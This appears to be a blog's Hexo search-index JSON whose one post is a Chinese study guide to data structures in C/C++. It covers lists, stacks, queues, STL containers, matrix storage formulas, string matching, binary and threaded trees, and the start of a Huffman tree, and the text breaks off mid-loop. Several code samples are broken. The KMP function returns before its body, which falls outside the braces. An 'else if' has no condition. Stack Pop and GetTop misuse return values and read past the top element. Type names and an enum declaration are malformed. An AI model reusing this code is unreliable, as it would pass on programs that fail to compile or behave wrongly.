{"meta":{"title":"Sa1ntCHENの小窝","subtitle":"Van!shment Th!s World","description":"","author":"Sa1ntCHEN","url":"https://saintcen.github.io","root":"/"},"pages":[{"title":"About","date":"2025-10-10T13:02:11.114Z","updated":"2025-10-10T13:02:11.114Z","comments":true,"path":"about/index.html","permalink":"https://saintcen.github.io/about/index.html","excerpt":"","text":""},{"title":"Tags","date":"2025-09-24T13:41:25.356Z","updated":"2025-09-24T13:41:25.356Z","comments":true,"path":"tags/index.html","permalink":"https://saintcen.github.io/tags/index.html","excerpt":"","text":""},{"title":"Categories","date":"2025-09-25T11:33:07.930Z","updated":"2025-09-25T11:33:07.930Z","comments":true,"path":"categories/index.html","permalink":"https://saintcen.github.io/categories/index.html","excerpt":"","text":""},{"title":"Friends","date":"2025-09-25T11:31:55.459Z","updated":"2025-09-25T11:31:55.459Z","comments":true,"path":"friends/index.html","permalink":"https://saintcen.github.io/friends/index.html","excerpt":"","text":""},{"title":"","date":"2025-09-25T11:38:19.849Z","updated":"2025-09-25T11:38:19.849Z","comments":true,"path":"contact/index.html","permalink":"https://saintcen.github.io/contact/index.html","excerpt":"","text":""}],"posts":[{"title":"数据结构（C语言版）","slug":"数据结构（C语言版）","date":"2025-09-25T16:00:00.000Z","updated":"2025-09-25T11:16:27.132Z","comments":true,"path":"2025/09/26/数据结构（C语言版）/","permalink":"https://saintcen.github.io/2025/09/26/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%EF%BC%88C%E8%AF%AD%E8%A8%80%E7%89%88%EF%BC%89/","excerpt":"","text":"Data Structure 线性表 顺序表 #define MAXSIZE 100 typedef int ElemType; typedef struct &#123; ElemType *elem; int length; &#125; Sqlist; &#x2F;&#x2F;初始化 void InitList(Sqlist &amp;L) &#123; L.elem &#x3D; new ElemType[MAXSIZE]; if (!L.elem) return; L.length &#x3D; 0; &#125; &#x2F;&#x2F;取值 void GetElem(Sqlist L, int i, ElemType &amp;e) &#123; if (i &lt; 1 || i &gt; L.length) return; e &#x3D; L.elem[i - 1]; &#125; &#x2F;&#x2F;定位 int LocateElem(Sqlist L, ElemType e) &#123; for (int i &#x3D; 0; i &lt; L.length; i++) &#123; if (L.elem[i] &#x3D;&#x3D; e) return i + 1; &#125; return 0; &#125; &#x2F;&#x2F;插入 void InsertElem(Sqlist &amp;L, int i, ElemType e) &#123; if (i &lt; 1 || i &gt; L.length + 1) return; if (L.length &#x3D;&#x3D; MAXSIZE) return; for (int j &#x3D; L.length - 1; j &gt;&#x3D; i - 1; j--) &#123; L.elem[j + 1] &#x3D; L.elem[j]; &#125; L.elem[i - 1] &#x3D; e; L.length++; &#125; &#x2F;&#x2F;删除 void DeleteElem(Sqlist &amp;L, int i) &#123; if (i &lt; 1 || i &gt; L.length) return; for (int j &#x3D; i; j &lt; L.length; j++) &#123; L.elem[j - 1] &#x3D; L.elem[j]; &#125; L.length--; &#125; 单链表 #include&lt;iostream&gt; using namespace std; typedef int ElemType; typedef struct Node &#123; ElemType data; struct Node* next; &#125;Node,*LinkList; &#x2F;&#x2F; 初始化(带头结点) void InitList(LinkList &amp;L) &#123; L &#x3D; (Node*)malloc(sizeof(Node)); L-&gt;next &#x3D; NULL; &#x2F;&#x2F;若不带头结点，直接L &#x3D; NULL; &#125; &#x2F;&#x2F; 求表长 int Length(LinkList L)&#123; int len &#x3D; 0; Node *p &#x3D; L; while(p-&gt;next!&#x3D;NULL)&#123; p &#x3D; p-&gt;next; len++; &#125; return len; &#125; &#x2F;&#x2F; 取值 void GetElem(LinkList L, int i, ElemType &amp;e) &#123; Node* p &#x3D; L; int j &#x3D; 0; while (p &amp;&amp; j &lt; i) &#123; p &#x3D; p-&gt;next; j++; &#125; if (!p || j &gt; i) return; e &#x3D; p-&gt;data; &#125; &#x2F;&#x2F; 查找 Node* LocateNode(LinkList L, ElemType e) &#123; Node* p &#x3D; L-&gt;next; while (p &amp;&amp; p-&gt;data !&#x3D; e) &#123; p &#x3D; p-&gt;next; &#125; return p; &#125; &#x2F;&#x2F;插入 void insertNode(LinkList &amp;L, int i, ElemType e) &#123; Node* p &#x3D; L; int j &#x3D; 0; while (p &amp;&amp; j &lt; i - 1) &#123; p &#x3D; p-&gt;next; j++; &#125; if (!p) return; Node* s &#x3D; new Node; s-&gt;data &#x3D; e; s-&gt;next &#x3D; p-&gt;next; p-&gt;next &#x3D; s; &#125; &#x2F;&#x2F;删除 void deleteNode(LinkList &amp;L, int i) &#123; Node* p &#x3D; L; int j &#x3D; 0; while (p &amp;&amp; j &lt; i - 1) &#123; p &#x3D; p-&gt;next; j++; &#125; if (!p-&gt;next||!p) return; Node* q &#x3D; p-&gt;next; p-&gt;next &#x3D; q-&gt;next; delete q; &#125; &#x2F;&#x2F;头插法 void createList_H(LinkList &amp;L, int n) &#123; L &#x3D; new Node; &#x2F;&#x2F; L固定为头结点 L-&gt;next &#x3D; NULL; for (int i &#x3D; 0; i &lt; n; i++) &#123; Node* p &#x3D; new Node; cin &gt;&gt; p-&gt;data; p-&gt;next &#x3D; L-&gt;next; L-&gt;next &#x3D; p; &#125; &#125; &#x2F;&#x2F;尾插法 void createList_R(Node* &amp;L, int n) &#123; L &#x3D; new Node; &#x2F;&#x2F;L为固定头结点 L-&gt;next &#x3D; NULL; Node* r &#x3D; L; for (int i &#x3D; 0; i &lt; n; i++) &#123; Node* p &#x3D; new Node; cin &gt;&gt; p-&gt;data; p-&gt;next &#x3D; NULL; r-&gt;next &#x3D; p; r &#x3D; p; &#125; &#x2F;&#x2F;循环列表，p-&gt;next &#x3D; L-&gt;next; &#125; &#x2F;&#x2F;遍历 void printlist(LinkList L) &#123; Node *p &#x3D; L; while (p) &#123; printf(&quot;%d &quot;, p-&gt;data); p &#x3D; p-&gt;next; &#125; printf(&quot;\\n&quot;); &#125; 双链表 #include&lt;iostream&gt; using namespace std; typedef int Elemtype; &#x2F;&#x2F; 定义双链表节点 typedef struct DNode &#123; Elemtype data; struct DNode* prior; struct DNode* next; &#125; DNode, *DList; &#x2F;&#x2F; 初始化双链表 DList initList() &#123; DNode* head &#x3D; new DNode(); head-&gt;prior &#x3D; nullptr; head-&gt;next &#x3D; nullptr; return head; &#125; &#x2F;&#x2F; 创建双链表 void createList(DList &amp;L, int n) &#123; DNode* p &#x3D; L; for (int i &#x3D; 0; i &lt; n; i++) &#123; DNode* newNode &#x3D; new DNode; cin &gt;&gt; newNode-&gt;data; newNode-&gt;prior &#x3D; p; newNode-&gt;next &#x3D; nullptr; p-&gt;next &#x3D; newNode; p &#x3D; newNode; &#125; &#x2F;&#x2F;循环链表，newNode-&gt;next &#x3D; L-&gt;next;L-&gt;next-&gt;prior &#x3D; newNode; &#125; &#x2F;&#x2F; 插入操作 void insertNode(DList &amp;L, int pos, Elemtype e) &#123; DNode* p &#x3D; L; int i &#x3D; 0; while (p &amp;&amp; i &lt; pos) &#123; p &#x3D; p-&gt;next; i++; &#125; if (!p) &#123; return; &#125; DNode* newNode &#x3D; new DNode; newNode-&gt;data &#x3D; e; newNode-&gt;next &#x3D; p-&gt;next; newNode-&gt;prior &#x3D; p; if (p-&gt;next) &#123; p-&gt;next-&gt;prior &#x3D; newNode; &#125; p-&gt;next &#x3D; newNode; &#125; &#x2F;&#x2F; 删除操作 void deleteNode(DList &amp;L, int pos) &#123; DNode* p &#x3D; L-&gt;next; int i &#x3D; 0; while (p &amp;&amp; i &lt; pos) &#123; p &#x3D; p-&gt;next; i++; &#125; if (!p) &#123; return; &#125; if (p-&gt;prior) &#123; p-&gt;prior-&gt;next &#x3D; p-&gt;next; &#125; if (p-&gt;next) &#123; p-&gt;next-&gt;prior &#x3D; p-&gt;prior; &#125; delete p; &#125; &#x2F;&#x2F; 正向遍历 void traverseForward(DList L) &#123; DNode* p &#x3D; L-&gt;next; while (p) &#123; cout &lt;&lt; p-&gt;data &lt;&lt; &quot; &quot;; p &#x3D; p-&gt;next; &#125; cout &lt;&lt; endl; &#125; &#x2F;&#x2F; 反向遍历 void traverseBackward(DList L) &#123; DNode* p &#x3D; L; while (p-&gt;next) &#123; p &#x3D; p-&gt;next; &#125; while (p !&#x3D; L) &#123; cout &lt;&lt; p-&gt;data &lt;&lt; &quot; &quot;; p &#x3D; p-&gt;prior; &#125; cout &lt;&lt; endl; &#125; STL list #include &lt;list&gt; #include&lt;iostream&gt; using namespace std; int main()&#123; list&lt;int&gt; l; &#x2F;&#x2F; 插入元素 l.push_back(10); l.push_front(5); &#x2F;&#x2F; 输出 for (int val : l) &#123; cout &lt;&lt; val &lt;&lt; &quot; &quot;; &#125; &#x2F;&#x2F; 查找元素 auto it &#x3D; find(l.begin(), l.end(), 10); if (it !&#x3D; l.end()) &#123; cout &lt;&lt; distance(l.begin(),it) &lt;&lt; endl; &#125; &#x2F;&#x2F; 删除元素 l.erase(l.begin()); &#x2F;&#x2F; 反转链表 l.reverse(); &#x2F;&#x2F; 排序链表 l.sort(); &#x2F;&#x2F; 删除相邻的重复元素 l.push_back(20); l.push_back(20); l.unique(); &#125; 静态链表 typedef int ElemType; #define MAXSIZE 50 typedef struct&#123; ElemType data; int next;&#x2F;&#x2F; 存储地址(具体数值) &#125;SLinkList[MAXSIZE]; 栈与队列 栈 #include &lt;iostream&gt; using namespace std; #define MAXSIZE 100 typedef int Elemtype; &#x2F;&#x2F;顺序存储 typedef struct &#123; Elemtype *top; Elemtype *base; int size; &#125; SqStack; void Init(SqStack &amp;s) &#123; s.base &#x3D; new Elemtype[MAXSIZE]; s.top &#x3D; s.base; s.size &#x3D; MAXSIZE; &#125; bool IsEmpty(SqStack s) &#123; return s.base &#x3D;&#x3D; s.top; &#125; bool IsFull(SqStack s) &#123; return (s.top - s.base) &#x3D;&#x3D; s.size; &#125; void Push(SqStack &amp;s, Elemtype e) &#123; if (IsFull(s)) &#123; return; &#125; *s.top &#x3D; e; s.top++; &#125; Elemtype Pop(SqStack &amp;s, Elemtype &amp;e) &#123; if (IsEmpty(s)) &#123; return; &#125; s.top--; e &#x3D; *s.top; &#125; void Print(SqStack &amp;s) &#123; if (IsEmpty(s)) &#123; return; &#125; for (Elemtype *p &#x3D; s.base; p !&#x3D; s.top; p++) &#123; cout &lt;&lt; *p &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl; &#125; Elemtype GetTop(SqStack s) &#123; if (IsEmpty(s)) &#123; return; &#125; Elemtype e &#x3D; *s.top; return e; &#125; &#x2F;&#x2F; 链式存储 typedef struct Linknode &#123; Elemtype data; struct Linknode *next; &#125; Linknode, *LiStack; void Init(LiStack &amp;s) &#123; s &#x3D; NULL; &#125; void Push(LiStack &amp;s, Elemtype e) &#123; LiStack p &#x3D; new Linknode; p-&gt;data &#x3D; e; p-&gt;next &#x3D; s; s &#x3D; p; &#125; void Pop(LiStack &amp;s, Elemtype &amp;e) &#123; if (s &#x3D;&#x3D; NULL) return; e &#x3D; s-&gt;data; LiStack p &#x3D; s; s &#x3D; s-&gt;next; delete p; &#125; Elemtype GetTop(LiStack s) &#123; if (s !&#x3D; NULL) return s-&gt;data; return -1; &#125; &#x2F;&#x2F; 共享存储 typedef struct &#123; Elemtype *base; Elemtype *top1; Elemtype *top2; int capacity; &#125; SharedStack; STL stack top() 访问栈顶元素（如果栈为空，此处会出错） push(x) 向栈中插入元素 x pop() 删除栈顶元素 size() 查询容器中的元素数量 empty() 询问容器是否为空 #include&lt;stack&gt; using namespace std; int main()&#123; stack&lt;int&gt; s1; s1.push(2); s1.push(1); cout &lt;&lt; s1.size() &lt;&lt; endl; s1.pop(); s1.pop(); cout &lt;&lt; s1.empty() &lt;&lt; endl; &#125; 队列 #include&lt;iostream&gt; using namespace std; #define maxsize 100 typedef int ElemType; typedef struct &#123; ElemType *base; int front; int rear; &#125; SqQueue;&#x2F;&#x2F; 可作为单向队列或循环队列，这里视为循环队列 &#x2F;&#x2F; 初始化 void InitQueue(SqQueue &amp;q) &#123; q.base &#x3D; new ElemType[maxsize]; if (!q.base) &#123; return; &#125; q.front &#x3D; 0; q.rear &#x3D; 0; &#125; &#x2F;&#x2F; 长度 int QueueLength(SqQueue q) &#123; return (q.rear - q.front + maxsize) % maxsize; &#125; &#x2F;&#x2F; 判断是否为空 bool IsEmpty(SqQueue q) &#123; return q.front &#x3D;&#x3D; q.rear; &#125; &#x2F;&#x2F; 判断是否已满 bool IsFull(SqQueue q) &#123; return (q.rear + 1) % maxsize &#x3D;&#x3D; q.front; &#125; &#x2F;&#x2F; 入队 void EnQueue(SqQueue &amp;q, ElemType e) &#123; if (IsFull(q)) &#123; return; &#125; q.base[q.rear] &#x3D; e; q.rear &#x3D; (q.rear + 1) % maxsize; &#125; &#x2F;&#x2F; 出队 void DeQueue(SqQueue &amp;q, ElemType &amp;e) &#123; if (IsEmpty(q)) &#123; return; &#125; e &#x3D; q.base[q.front]; q.front &#x3D; (q.front + 1) % maxsize; &#125; &#x2F;&#x2F; 获取队头元素 ElemType GetHead(SqQueue q) &#123; if (!IsEmpty(q)) &#123; return q.base[q.front]; &#125; return -1; &#125; &#x2F;&#x2F; 打印 void PrintQueue(SqQueue q) &#123; if (IsEmpty(q)) &#123; return; &#125; int i &#x3D; q.front; while (i !&#x3D; q.rear) &#123; cout &lt;&lt; q.base[i] &lt;&lt; &quot; &quot;; i &#x3D; (i + 1) % maxsize; &#125; cout &lt;&lt; endl; &#125; &#x2F;&#x2F; 队列链式存储(带头结点) &#x2F;&#x2F; 节点定义 typedef struct QNode&#123; ElemType data; struct QNode *next; &#125;QNode; &#x2F;&#x2F; 链队列定义 typedef struct &#123; QNode *front; QNode *rear; &#125;LinkQueue; &#x2F;&#x2F; 初始化队列 void InitQueue(LinkQueue &amp;Q) &#123; Q.front &#x3D; new QNode; Q.rear &#x3D; Q.front; Q.front-&gt;next &#x3D; NULL; &#125; &#x2F;&#x2F; 判断为空 bool IsEmpty(LinkQueue Q)&#123; return (Q.front &#x3D;&#x3D; Q.rear); &#125; &#x2F;&#x2F; 入队操作 void EnQueue(LinkQueue &amp;Q, ElemType e) &#123; QNode *newNode &#x3D; new QNode; newNode-&gt;data &#x3D; e; newNode-&gt;next &#x3D; NULL; Q.rear-&gt;next &#x3D; newNode; Q.rear &#x3D; newNode; &#125; &#x2F;&#x2F; 出队操作 void DeQueue(LinkQueue &amp;Q, ElemType &amp;e) &#123; if (IsEmpty(Q)) &#123; return; &#125; QNode *temp &#x3D; Q.front-&gt;next; e &#x3D; temp-&gt;data; Q.front-&gt;next &#x3D; temp-&gt;next; if (temp &#x3D;&#x3D; Q.rear) &#123; Q.rear &#x3D; Q.front; &#125; delete temp; &#125; &#x2F;&#x2F; 获取队头元素 ElemType GetFront(LinkQueue Q) &#123; if (IsEmpty(Q)) &#123; return -1; &#125; return Q.front-&gt;next-&gt;data; &#125; STL queue front() 访问队首元素（如果队列为空，此处会出错） push(x) 向队列中插入元素 x pop() 删除队首元素 size() 查询容器中的元素数量 empty() 询问容器是否为空 deque push_front(x) 在队首插入元素 x push_back(x) 在队尾插入元素 x pop_front() 删除队首元素 pop_back() 删除队尾元素 front() 访问队首元素 back() 访问队尾元素 size() 查询元素数量 empty() 判断是否为空 #include&lt;queue&gt; #include&lt;iostream&gt; using namespace std; int main()&#123; &#x2F;&#x2F; 单向队列 queue&lt;int&gt; q1; q1.push(2); q1.push(1); q1.pop(); cout &lt;&lt; q1.size() &lt;&lt; endl; cout &lt;&lt; q1.front() &lt;&lt; endl; q1.pop(); cout &lt;&lt; q1.empty() &lt;&lt; endl; &#x2F;&#x2F; 双向队列 deque&lt;int&gt; dq; dq.push_back(3); dq.push_front(1); dq.pop_front(); dq.push_front(5); dq.pop_back(); dq.pop_back(); cout &lt;&lt; dq.size() &lt;&lt; endl; cout &lt;&lt; dq.empty() &lt;&lt; endl; &#125; 优先队列(priority_queue) &#x2F;&#x2F; 默认最小堆(原理其实是构建完全二叉树进行堆排序，因此初始化时有数组和比较条件) priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt; pq &#x2F;&#x2F; 自定义堆 struct cmp &#123; bool operator()(int a, int b) &#123; return a &lt; b; &#x2F;&#x2F; 最大堆 &#125; &#125;; priority_queue&lt;int, vector&lt;int&gt;, cmp&gt; pq; &#x2F;&#x2F; 插入元素 int element &#x3D; 1; pq.push(element); &#x2F;&#x2F; 访问顶部元素 int top &#x3D; pq.top(); &#x2F;&#x2F; 删除顶部元素 pq.pop(); &#x2F;&#x2F; 检查是否为空 bool isEmpty &#x3D; pq.empty(); &#x2F;&#x2F; 获取元素数量 size_t size &#x3D; pq.size(); 数组 以二维数组为例： LOC(i, j) = LOC(0, 0) + (n * i + j) * L 其中L为每个数组元素所占的单元。 特殊矩阵的压缩存储 1.对称矩阵 对于 n 阶矩阵 A，若ai, j = aj, i，则为对称矩阵。假设我们要压缩成一维数组，求解下标k有以下公式： $$ i&gt;=j,k = \\frac{i(i-1)}{2}+j-1\\\\i&lt;j,k = \\frac{j(j-1)}{2}+i-1\\\\ $$ 2.三角矩阵 $$ 上三角：i&gt;j,k = \\frac{n(n+1)}{2},i&lt;=j,\\frac{(2n-i+2)(i-1)}{2}+j-i\\\\ 下三角：i&gt;j,k = \\frac{i(i-1)}{2}+j-1,i&lt;=j,\\frac{n(n+1)}{2} $$ 3.带状矩阵 第 1 行和第 n 行有两个元，其余行均有三个元，（形成三条对角线），对ai, j若压缩成一维矩阵有： k = 2i + j − 3 4.稀疏矩阵 将稀疏分布的矩阵转为三元组（行标i，列标j，值ai, j） typedef struct&#123; int col; int row; int data; &#125;Matrix; STL vector push_back(x) 在尾部插入元素 x pop_back() 删除尾部元素 front() 访问首元素 back() 访问尾元素 size() 查询元素数量 empty() 判断是否为空 clear() 清空所有元素 #include&lt;vector&gt; #include&lt;iostream&gt; using namespace std; int main()&#123; vector&lt;int&gt; vec; vec.push_back(1); vec.push_back(2); vec.pop_back(); vec.push_back(3); cout &lt;&lt; vec.size() &lt;&lt; endl; cout &lt;&lt; vec.front() &lt;&lt; endl; cout &lt;&lt; vec.back() &lt;&lt; endl; cout &lt;&lt; vec[1] &lt;&lt; endl; vec.clear(); cout &lt;&lt; vec.empty() &lt;&lt; endl; vector&lt;vector&lt;int&gt;&gt; matrix(3, vector&lt;int&gt;(2, 0));&#x2F;&#x2F; 3行，2列，每行填充0 matrix[0][0] &#x3D; 1; matrix[1].push_back(3); vector&lt;int&gt; new_row &#x3D; &#123;5, 7, 9&#125;; matrix.push_back(new_row); for (int i &#x3D; 0; i &lt; matrix.size(); i++) &#123; for (int j &#x3D; 0; j &lt; matrix[i].size(); j++) &#123; cout &lt;&lt; matrix[i][j] &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl; &#125; &#125; 串 #include &lt;iostream&gt; #include &lt;string&gt; #include &lt;vector&gt; using namespace std; #define maxlen 255 &#x2F;&#x2F; 顺序存储 typedef struct&#123; char ch[maxlen]; int length; &#125;SString; &#x2F;&#x2F; 堆分配存储 typedef struct&#123; char *ch; int length; &#125;HString; &#x2F;&#x2F; 链式存储 typedef struct CharNode &#123; char ch; struct CharNode *next; &#125; CharNode, *CharPtr; typedef struct &#123; CharPtr head; int length; &#125; LString; &#x2F;&#x2F; 字串定位算法 &#x2F;&#x2F; Brute-Force int BF(SString s,SSting t,int pos)&#123; int i &#x3D; pos; int j &#x3D; 1; while(i&lt;&#x3D;s.length &amp;&amp; j&lt;&#x3D;t.length())&#123; if(s.ch[i]&#x3D;&#x3D;t.ch[j])&#123; i++; j++; &#125; else&#123; i &#x3D; i - j + 2; j &#x3D; 1; &#125; &#125; if(j&gt;t.length) return i-t.length; else return 0; &#125; &#x2F;&#x2F; KMP vector&lt;int&gt; Next(const string &amp;j) &#123; int m &#x3D; j.length(); vector&lt;int&gt; next(m + 1, 0); int k &#x3D; 0; next[0] &#x3D; -1; for (int i &#x3D; 1; i &lt; m; i++) &#123; while (k &gt;&#x3D; 0 &amp;&amp; j[i] !&#x3D; j[k]) &#123; k &#x3D; next[k]; &#125; k++; next[i + 1] &#x3D; k; &#125; return next; &#125; void KMP(const string &amp;t, const string &amp;j) &#123; int n &#x3D; t.length(); int m &#x3D; j.length(); return; &#125; vector&lt;int&gt; next &#x3D; Next(j); int i &#x3D; 0; int k &#x3D; 0; while (i &lt; n) &#123; if (k &#x3D;&#x3D; -1 || t[i] &#x3D;&#x3D; j[k]) &#123; i++; k++; if (k &#x3D;&#x3D; m) &#123; cout &lt;&lt; t.substr(i - m) &lt;&lt; endl; return; &#125; &#125; else &#123; k &#x3D; next[k]; &#125; return; &#125; STL string 长度：s.size()/s.length() 查找字符（串）第一次出现的位置：s.find(u)/s.find(t,pos) 注：不是 KMP 截取子串：substr(pos,len) 插入：insert(index,str) 替换字符串：replace(first,second,str) #include &lt;iostream&gt; #include &lt;string&gt; using namespace std; int main()&#123; string s &#x3D; &quot;hello, world&quot;; cout &lt;&lt; s.size() &lt;&lt; endl; size_t pos1 &#x3D; s.find(&#39;o&#39;); size_t pos2 &#x3D; s.find(&quot;world&quot;, 0); string sub &#x3D; s.substr(7, 5); string s2 &#x3D; s; s2.insert(5, &quot; C++&quot;); string s3 &#x3D; s; s3.replace(0, 5, &quot;Hi&quot;); &#125; 广义表 typedef enum(ATOM,LIST) ElemTag;&#x2F;&#x2F;ATOM&#x3D;&#x3D;0,原子；LIST&#x3D;&#x3D;1，子表 typedef struct GLNode &#123; ElemTag tag;&#x2F;&#x2F;区分原子结点or表结点 union&#123; AtomType atom;&#x2F;&#x2F;原子值域 struct&#123; struct GNode* hp,*tp; &#125;ptr; &#125;; &#125;*GList; GetHead(LS);&#x2F;&#x2F;取表头 GetTail(LS);&#x2F;&#x2F;取表尾，仍为广义表 树 二叉树 #include &lt;iostream&gt; #include &lt;stack&gt; #include &lt;queue&gt; using namespace std; #define MAXSIZE 100 typedef int TElemType; &#x2F;&#x2F; 顺序存储结构（即层序遍历，空结点值为0） typedef struct&#123; TElemType data[MAXSIZE]; &#125;SqBiTree; &#x2F;&#x2F; 链式定义结点结构 typedef struct BiTNode &#123; TElemType data; BiTNode *lchild, *rchild; &#125; BiTNode, *BiTree; &#x2F;&#x2F; 中序遍历（递归） void InOrderTraverse(BiTree T) &#123; if (T) &#123; InOrderTraverse(T-&gt;lchild); cout &lt;&lt; T-&gt;data; InOrderTraverse(T-&gt;rchild); &#125; &#125; &#x2F;&#x2F; 先序遍历（递归） void PreOrderTraverse(BiTree T) &#123; if (T) &#123; cout &lt;&lt; T-&gt;data; PreOrderTraverse(T-&gt;lchild); PreOrderTraverse(T-&gt;rchild); &#125; &#125; &#x2F;&#x2F; 后序遍历（递归） void PostOrderTraverse(BiTree T) &#123; if (T) &#123; PostOrderTraverse(T-&gt;lchild); PostOrderTraverse(T-&gt;rchild); cout &lt;&lt; T-&gt;data; &#125; &#125; &#x2F;&#x2F; 中序遍历（非递归） void InOrderTraverse_NonRecursive(BiTree T) &#123; stack&lt;BiTree&gt; s; BiTree p &#x3D; T; while (p || !s.empty()) &#123; if (p) &#123; s.push(p); p &#x3D; p-&gt;lchild; &#125; else &#123; BiTree q &#x3D; s.top(); s.pop(); cout &lt;&lt; q-&gt;data; p &#x3D; q-&gt;rchild; &#125; &#125; &#125; &#x2F;&#x2F; 先序遍历（非递归） void PreOrderTraverse_NonRecursive(BiTree T) &#123; if (!T) return; stack&lt;BiTree&gt; s; s.push(T); while (!s.empty()) &#123; BiTree q &#x3D; s.top(); s.pop(); cout &lt;&lt; q-&gt;data; if (q-&gt;rchild) s.push(q-&gt;rchild); &#x2F;&#x2F; 右子树后访问 根据栈先进后出的原则先进 if (q-&gt;lchild) s.push(q-&gt;lchild); &#125; &#125; &#x2F;&#x2F; 后序遍历（非递归） void PostOrderTraverse_NonRecursive(BiTree T) &#123; stack&lt;BiTree&gt; s; BiTree p &#x3D; T; BiTree lastVisited &#x3D; nullptr; while (p || !s.empty()) &#123; if (p) &#123; s.push(p); p &#x3D; p-&gt;lchild; &#125; else &#123; BiTree q &#x3D; s.top(); if (q-&gt;rchild &amp;&amp; lastVisited !&#x3D; q-&gt;rchild) &#123; p &#x3D; q-&gt;rchild; &#125; else &#123; cout &lt;&lt; q-&gt;data; lastVisited &#x3D; q; s.pop(); &#125; &#125; &#125; &#125; &#x2F;&#x2F; 层次遍历二叉树 void LevelOrderTraverse(BiTree T) &#123; if (!T) return; queue&lt;BiTree&gt; q; q.push(T); while (!q.empty()) &#123; BiTree node &#x3D; q.front(); q.pop(); cout &lt;&lt; node-&gt;data &lt;&lt; &#39; &#39;; if (node-&gt;lchild) q.push(node-&gt;lchild); if (node-&gt;rchild) q.push(node-&gt;rchild); &#125; &#125; &#x2F;&#x2F; 根据前序输入创建二叉树，&#39;#&#39;表示空节点 void CreateBiTree(BiTree &amp;T) &#123; char ch; cin &gt;&gt; ch; if (ch &#x3D;&#x3D; &#39;#&#39;) &#123; T &#x3D; nullptr; &#125; else &#123; T &#x3D; new BiTNode; T-&gt;data &#x3D; ch; CreateBiTree(T-&gt;lchild); CreateBiTree(T-&gt;rchild); &#125; &#125; &#x2F;&#x2F; 根据中序输入创建二叉树，&#39;#&#39;表示空节点 void CreateBiTree(BiTree &amp;T) &#123; char ch; cin &gt;&gt; ch; if (ch &#x3D;&#x3D; &#39;#&#39;) &#123; T &#x3D; nullptr; &#125; else &#123; CreateBiTree(T-&gt;lchild); T &#x3D; new BiTNode; T-&gt;data &#x3D; ch; CreateBiTree(T-&gt;rchild); &#125; &#125; &#x2F;&#x2F; 根据后序输入创建二叉树，&#39;#&#39;表示空节点 void CreateBiTree(BiTree &amp;T) &#123; char ch; cin &gt;&gt; ch; if (ch &#x3D;&#x3D; &#39;#&#39;) &#123; T &#x3D; nullptr; &#125; else &#123; CreateBiTree(T-&gt;lchild); CreateBiTree(T-&gt;rchild); T &#x3D; new BiTNode; T-&gt;data &#x3D; ch; &#125; &#125; &#x2F;&#x2F; 计算二叉树的高度 int Depth(BiTree T) &#123; if (!T) return 0; int m &#x3D; Depth(T-&gt;lchild); int n &#x3D; Depth(T-&gt;rchild); return (m &gt; n ? m + 1 : n + 1); &#125; &#x2F;&#x2F; 统计二叉树的节点个数 int NodeCount(BiTree T) &#123; if (!T) return 0; return NodeCount(T-&gt;lchild) + NodeCount(T-&gt;rchild) + 1; &#125; &#x2F;&#x2F; 线索二叉树的结点结构 typedef struct BiThrNode &#123; TElemType data; BiThrNode *lchild, *rchild; int LTag, RTag; &#x2F;&#x2F; 0 表示指针，1 表示线索 &#125; BiThrNode, *BiThrTree; &#x2F;&#x2F; 全局变量，用于中序线索化过程中的前驱节点 BiThrNode *pre &#x3D; nullptr; &#x2F;&#x2F; 中序线索化（递归） void InThreading(BiThrTree p) &#123; if (p) &#123; InThreading(p-&gt;lchild); if (!p-&gt;lchild) &#123; p-&gt;LTag &#x3D; 1; p-&gt;lchild &#x3D; pre; &#125; else &#123; p-&gt;LTag &#x3D; 0; &#125; if (pre &amp;&amp; !pre-&gt;rchild) &#123; pre-&gt;RTag &#x3D; 1; pre-&gt;rchild &#x3D; p; &#125; else if &#123; pre-&gt;RTag &#x3D; 0; &#125; pre &#x3D; p; InThreading(p-&gt;rchild); &#125; &#125; &#x2F;&#x2F; 构建中序线索二叉树（带头结点） void CreateInOrderThread(BiThrTree &amp;T) &#123; BiThrTree head &#x3D; new BiThrNode; head-&gt;LTag &#x3D; 0; head-&gt;RTag &#x3D; 1; head-&gt;rchild &#x3D; head; pre &#x3D; head; head-&gt;lchild &#x3D; T; InThreading(T); pre-&gt;rchild &#x3D; head; pre-&gt;RTag &#x3D; 1; T &#x3D; head; &#125; &#x2F;&#x2F; 遍历中序线索二叉树（非递归） void InOrderTraverse_Thr(BiThrTree T) &#123; BiThrTree p &#x3D; T-&gt;lchild; while (p !&#x3D; T) &#123; while (p-&gt;LTag &#x3D;&#x3D; 0) p &#x3D; p-&gt;lchild; cout &lt;&lt; p-&gt;data; while (p-&gt;RTag &#x3D;&#x3D; 1 &amp;&amp; p-&gt;rchild !&#x3D; T) &#123; p &#x3D; p-&gt;rchild; cout &lt;&lt; p-&gt;data; &#125; p &#x3D; p-&gt;rchild; &#125; &#125; 树与森林 #define MAXSIZE 100 &#x2F;&#x2F; 双亲表示法 typedef struct&#123; char data; int parent; &#125;PTNode; typedef struct&#123; PTNode nodes[MAXSIZE]; int n; &#125;PTree; &#x2F;&#x2F; 孩子表示法 typedef struct CSNode&#123; char data; struct CSNode* firstchild,*nextsibling; &#125;CSNode,*CSTree; 哈夫曼树 #include &lt;iostream&gt; #include &lt;cstring&gt; #include &lt;queue&gt; #include &lt;vector&gt; using namespace std; typedef struct &#123; int weight; int parent, lchild, rchild; &#125; HTNode, *HuffmanTree; typedef char **HuffmanCode; void CreateHuffmanTree(HuffmanTree &amp;T, int n) &#123; if (n &lt;&#x3D; 1) return; int m &#x3D; 2 * n - 1; T &#x3D; new HTNode[m + 1]; &#x2F;&#x2F; 初始化所有节点 for (int i &#x3D; 1; i &lt;&#x3D; m; i++) &#123; T[i].parent &#x3D; 0; T[i].lchild &#x3D; 0; T[i].rchild &#x3D; 0; T[i].weight &#x3D; 0; &#125; &#x2F;&#x2F; 输入叶子节点权重 for (int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; cin &gt;&gt; T[i].weight; &#125; &#x2F;&#x2F; 使用优先队列存储 priority_queue&lt;pair&lt;int, int&gt;, vector&lt;pair&lt;int, int&gt;&gt;, greater&lt;pair&lt;int, int&gt;&gt;&gt; pq; for (int i &#x3D; 1; i &lt;&#x3D; n; i++) &#123; pq.push(make_pair(T[i].weight, i)); &#125; int current &#x3D; n + 1; &#x2F;&#x2F; 当前中间节点索引 for (int i &#x3D; 1; i &lt;&#x3D; n - 1; i++) &#123; 